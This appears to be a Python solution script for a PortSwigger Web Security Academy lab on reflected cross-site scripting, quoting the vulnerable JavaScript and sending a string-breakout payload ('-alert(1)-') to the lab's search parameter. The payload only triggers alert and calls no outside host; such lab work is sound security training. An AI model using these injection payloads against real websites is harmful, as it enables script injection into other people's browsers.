'''
This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.

Lab link: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded
'''

'''
Vulnerable Code
<script>
                        var searchTerms = '';
                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script>
'''

import requests


lab_id = '0af500f003073478a4a1985000140040' #change based on generated lab
payload = "'-alert(1)-'" # search parameter will get injected into the searchTerms string
uri = f"https://{lab_id}.web-security-academy.net/?search={payload}" 

r = requests.get(uri)
print('done')